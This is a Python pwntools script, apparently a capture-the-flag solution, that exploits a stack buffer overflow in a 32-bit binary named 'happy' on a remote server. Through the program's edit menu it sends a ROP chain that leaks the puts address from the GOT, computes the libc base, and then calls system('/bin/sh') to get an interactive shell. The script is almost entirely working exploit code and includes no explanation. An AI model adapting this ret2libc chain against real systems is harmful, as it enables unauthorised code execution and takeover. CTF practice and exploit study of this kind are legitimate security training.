from pwn import *
import os

context.log_level = 'debug'

libc = ELF('./libc-2.23.so')
elf = ELF('./happy')

DEBUG = False

if DEBUG:
    env = os.environ
    env['LD_PRELOAD'] = './libc-2.23.so'
    p = process('./happy', env=env)
else:
    p = remote('202.112.51.217', 23413)
    
p.recvuntil('Please input your option:\n')
p.sendline('1')
p.recvuntil('name:')
p.sendline('1oner')
p.recvuntil('password:')
p.sendline('1oner')
p.recvuntil('):')
p.sendline('0')
p.recvuntil('secret:')
p.sendline('1oner')

p.recvuntil('Please input your option:\n')
p.sendline('4')
p.recvuntil('EDIT:')
p.sendline('1oner')
p.recvuntil('password:')
p.sendline('1oner')
p.recvuntil('level:')
p.sendline('0')
p.recvuntil('secret:')
p.sendline('1oner')
p.recvuntil('y/n\n')

puts_plt = elf.symbols['puts']
puts_got = elf.got['puts']
gets_plt = elf.symbols['gets']
pret = 0x08048481
bss = 0x0804b800

payload = 'A'*0x7a + p32(bss) + p32(puts_plt) + p32(pret) + p32(puts_got) + p32(gets_plt) + p32(0x080489DB) + p32(bss)
p.sendline(payload)
p.recvuntil('Your changes have been recorded!\n')
puts_addr = u32(p.recv(4))

libc_base = puts_addr - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search('/bin/sh'))

payload = 'B'*4 + p32(system_addr) + p32(0xdeadbeef) + p32(binsh)
p.sendline(payload)

p.interactive()

